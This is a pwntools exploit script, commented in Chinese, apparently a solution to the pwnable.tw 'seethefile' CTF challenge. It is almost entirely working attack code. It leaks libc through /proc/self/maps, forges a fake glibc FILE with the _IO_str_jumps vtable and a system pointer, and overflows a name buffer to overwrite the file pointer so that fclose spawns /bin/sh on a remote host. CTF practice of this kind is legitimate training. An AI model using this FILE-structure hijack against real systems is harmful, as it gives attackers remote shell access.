from pwn import *
import os
import re
import resource
import ssl
import time

context.arch = "i386"
context.log_level = "info"

try:                                   # 收尾的 invalid free 会 abort，别在仓库里落 core
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
except (ValueError, OSError):
    pass

BIN = "./seethefile"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
I386_LD = os.getenv("I386_LD", "")
I386_LIBPATH = os.getenv("I386_LIBPATH", "")
LIBC_PATH = os.getenv("LIBC", "../ret2libc/libc-2.24.so")

# 二进制的全局对象（No PIE）
MAGICBUF = 0x804B0C0            # 0x190 字节，fread() 的落点
FP = 0x804B280                  # FILE *fp，紧跟 char name[0x20] (0x804B260)
BLOB_LEN = 0x18F                # fread(magicbuf, 0x18F, 1, fp) 的固定长度

# glibc 2.24-3ubuntu2.2 i386（md5 79f8c0d940ae393b3ad1be40892c9c84）兜底偏移。
# 有 LIBC 文件时以文件里的符号 / __libc_IO_vtables 扫描结果为准。
SYSTEM_24 = 0x3B020
STR_JUMPS_24 = 0x1B49C0

# libc 首段映射（r-xp offset 00000000）-> base
MAPS_PAT = re.compile(
    rb"([0-9a-f]{8})-[0-9a-f]{8} r-xp 00000000 \S+ \d+ +/.*?(?:libc-?[\d.]*\.so|libc\.so\.6)"
)


def start():
    if args.LOCAL:
        if I386_LD:
            return process([I386_LD, "--library-path", I386_LIBPATH, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 29_pwnable_tw_seethefile_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def find_str_jumps(libc):
    """在 __libc_IO_vtables 里定位 _IO_str_jumps。

    判据（三重，缺一不可）：
      1. T[0] = T[1] = 0（两个 dummy）；
      2. T[2] = _IO_str_finish：前 0x18 字节里既有 `mov eax, [reg+0x1c]`
         （读 _IO_buf_base），又有 `call dword [reg+0x9c]`（调 _s._free_buffer）；
      3. T[3] = _IO_str_overflow：开头就有 `mov eax, [reg]; test al, 0x8`
         （判 _IO_NO_WRITES）。
    _IO_wstr_jumps 也满足 2/3 的一部分，只有上面的组合能唯一命中 _IO_str_jumps。
    """
    sec = next((s for s in libc.sections if s.name == "__libc_IO_vtables"), None)
    text = next((s for s in libc.sections if s.name == ".text"), None)
    if sec is None or text is None:
        return None
    lo, hi = text.header.sh_addr, text.header.sh_addr + text.header.sh_size
    start, size = sec.header.sh_addr, sec.header.sh_size
    free_buf = [b"\xff" + bytes([r]) + b"\x9c\x00\x00\x00"
                for r in (0x93, 0x96, 0x92, 0x95, 0x97, 0x91)]
    buf_base = [b"\x8b" + bytes([r]) + b"\x1c"
                for r in (0x43, 0x45, 0x46, 0x47, 0x41, 0x42)]
    no_writes = [b"\x8b\x06\xa8\x08", b"\x8b\x45\x00\xa8\x08", b"\x8b\x03\xa8\x08"]
    for off in range(0, max(size - 0x28, 1), 4):
        addr = start + off
        ents = [u32(libc.read(addr + 4 * k, 4)) for k in range(10)]
        if ents[0] or ents[1] or not lo <= ents[2] < hi or not lo <= ents[3] < hi:
            continue
        fin = libc.read(ents[2], 0x40)
        ovf = libc.read(ents[3], 0x20)
        if (any(p in fin for p in free_buf)
                and any(p in fin[:0x18] for p in buf_base)
                and any(p in ovf for p in no_writes)):
            return addr
    return None


def resolve_offsets():
    if LIBC_PATH and os.path.exists(LIBC_PATH):
        libc = ELF(LIBC_PATH, checksec=False)
        system = libc.symbols["system"]
        str_jumps = find_str_jumps(libc) or STR_JUMPS_24
        return system, str_jumps, LIBC_PATH
    log.warning("LIBC 不存在（%s），使用 2.24-3ubuntu2.2 i386 硬编码偏移" % LIBC_PATH)
    return SYSTEM_24, STR_JUMPS_24, None


def build_blob(base, str_jumps, system):
    """0x804B0C0 处的假 FILE（_IO_strfile 视角）。

    +0x00 _flags     : 0xFBAD0000 -> 通过 CHECK_FILE，且不带 _IO_USER_BUF
    +0x1c _IO_buf_base -> "/bin/sh"（_IO_str_finish 的唯一参数）
    +0x38 _fileno    : -1        -> _IO_file_close_it 立刻返回，不碰真实 fd
    +0x48 _lock      : 指向缓冲区里 12 字节清零的锁，供 fclose 加锁路径
    +0x94 vtable     : _IO_str_jumps（必须在 __libc_IO_vtables 内，否则 abort）
    +0x9c _s._free_buffer -> system
    """
    b = bytearray(BLOB_LEN)
    b[0x00:0x04] = p32(0xFBAD0000)
    b[0x1C:0x20] = p32(MAGICBUF + 0x140)
    b[0x38:0x3C] = p32(0xFFFFFFFF)
    b[0x48:0x4C] = p32(MAGICBUF + 0x130)
    b[0x94:0x98] = p32(base + str_jumps)
    b[0x9C:0xA0] = p32(base + system)
    b[0x130:0x13C] = p32(0) * 3
    b[0x140:0x148] = b"/bin/sh\x00"
    assert len(b) == BLOB_LEN
    return bytes(b)


def open_file(p, name):
    """1. Open：fopen(name, "r") -> fp，正常返回时停在菜单提示。"""
    p.sendline(b"1")
    p.recvuntil(b"see :")
    p.sendline(name)
    p.recvuntil(b"Your choice :")


def read_show(p):
    """2. Read + 3. Write to screen：返回 magicbuf 里这 0x18F 字节的内容。"""
    p.sendline(b"2")
    p.recvuntil(b"Your choice :")          # Read Successful + 菜单
    p.sendline(b"3")
    chunk = p.recvuntil(b"Your choice :")
    data = chunk.split(b"---------------MENU")[0]
    if data.endswith(b"\n"):
        data = data[:-1]
    return data


def leak_libc(p):
    """readfile() 每次只 fread 0x18F 字节，所以要反复 Read/Write 把 maps 抽干。"""
    open_file(p, b"/proc/self/maps")
    leak = b""
    m = None
    for _ in range(12):
        data = read_show(p)
        if not data:                       # fread 到 EOF -> magicbuf 全 0
            break
        leak += data
        m = MAPS_PAT.search(leak)
        if m:
            break
    if not m:
        raise SystemExit("[-] /proc/self/maps 里没找到 libc 行：\n%s"
                         % leak.decode("latin-1"))
    return int(m.group(1), 16), leak


def exploit():
    system_off, str_jumps, libc_file = resolve_offsets()
    log.info("system=%#x  _IO_str_jumps=%#x  (libc: %s)"
             % (system_off, str_jumps, libc_file or "hardcoded"))

    p = start()
    p.recvuntil(b"Your choice :")

    base, _ = leak_libc(p)
    if base & 0xFFF:
        raise SystemExit("[-] libc base %#x 未页对齐，LIBC 与目标不匹配" % base)
    log.success("libc base = %#x  system = %#x" % (base, base + system_off))

    # 先把 maps 关掉，再把 stdin 当普通文件打开，好让 fread 灌二进制 fake FILE
    p.sendline(b"4")
    p.recvuntil(b"Your choice :")
    open_file(p, b"/dev/stdin")
    p.sendline(b"2")
    time.sleep(0.3)                        # 让 scanf 先读完 "2\n"，别吞掉 blob
    p.send(build_blob(base, str_jumps, system_off))
    p.recvuntil(b"Your choice :")

    # 隐藏分支 5：scanf("%s", name) 溢出到 fp，fclose(fake FILE) -> system("/bin/sh")
    p.sendline(b"5")
    p.recvuntil(b"Leave your name :")
    p.send(b"A" * 0x20 + p32(MAGICBUF) + b"\n")   # name[0x20] -> FP，fp = magicbuf
    p.recvuntil(b"see you next time", timeout=5)
    time.sleep(0.3)
    p.sendline(b"echo __PWNED__; id; exit")

    out = p.recvrepeat(3).decode("utf-8", errors="ignore")
    print(out)
    if "__PWNED__" in out:
        print("[+] shell ok")
    else:
        print("[-] shell failed, raw output above")


if __name__ == "__main__":
    exploit()
